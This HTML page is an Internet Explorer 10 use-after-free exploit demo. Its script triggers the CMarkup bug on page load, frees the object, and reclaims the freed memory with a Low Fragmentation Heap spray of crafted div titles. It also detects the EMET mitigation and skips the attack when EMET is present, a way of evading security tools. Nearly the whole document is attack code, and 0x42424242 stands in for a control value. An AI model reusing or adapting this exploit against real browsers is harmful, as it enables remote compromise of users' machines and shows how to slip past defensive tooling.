<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8"/>
	<title>GH4-UAF-LFH Demo</title>
	<meta name="description" content="" />
<script>
		function dword2data(dword) {
			var d = Number(dword).toString(16);
			while (d.length < 8)
				d = '0' + d;
			return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
		}

		function developonther(txt) {
			var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
			xmlDoc.async = true;
			xmlDoc.loadXML(txt);
			if (xmlDoc.parseError.errorCode != 0) {
				var err;
				err = "Error Code: " + xmlDoc.parseError.errorCode + "\n";
				err += "Error Reason: " + xmlDoc.parseError.reason;
				err += "Error Line: " + xmlDoc.parseError.line;
				if (err.indexOf("-2147023083") > 0) {
					return 1; //Stop running since EMET is installed
				} else {
					return 0;
				}

			}
			return 0;

		}

		var g_arr = [];
		var arrLen = 0x13;//18 times to enable LFH and 1 more to overwrite the CMarkup Object

		function fun() {

			var b = dword2data(0xdeadc0de);
			var c = 0x1a1b2000;
			while (b.length < 0x360) {
				if (b.length == (0x94 / 2)) {
					b += dword2data(c + 0x10 - 0x0c)
				} else if (
					b.length == (0x98 / 2)) {
					b += dword2data(c + 0x14 - 0x8)
				} else if (b.length == (0xac / 2)) {
					b += dword2data(c - 0x10)
				} else if (b.length == (0x15c / 2)) {
					b += dword2data(0x42424242)
				} else {
					b += dword2data(0x1a1b2000 - 0x10)
				}
			};
			var d = b.substring(0, (0x340 - 2) / 2);//Div by 2 since it is unicode format (2 bytes per value)
			try {
				this.outerHTML = this.outerHTML//Freed the object
			} catch (e) {}
			CollectGarbage();
			for (a = 0; a < arrLen; ++a) {
				g_arr[a] = document.createElement('div')
				g_arr[a].title = d.substring(0, d.length);//Overwritting CMarkup Object
			}	
		}

		function Yamie() {
			alert("Low Fragmentation Heap...");
			var bamboo_go = "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'res://C:\\windows\\AppPatch\\EMET.DLL'>";

			if (navigator.userAgent.indexOf("MSIE 10.0") > 0) {
				if (developonther(bamboo_go)) {
					return;
				}
				var a = document.getElementsByTagName("script");
				var b = a[0];
				b.onpropertychange = fun;
				var c = document.createElement('SELECT');
				//Trigger the vuln inside MSTHML!CMarkup::UpdateMarkupContentsVersion
				c = b.appendChild(c); 
			} else if (navigator.userAgent.indexOf("IE10") > 0) {
				if (developonther(bamboo_go)) {
					return;
				}
				var a = document.getElementsByTagName("script");
				var b = a[0];
				b.onpropertychange = fun;
				var c = document.createElement('SELECT');
				c = b.appendChild(c);
			}


		}
	</script>
</head>
<body onload="Yamie();">
</body>
</html>
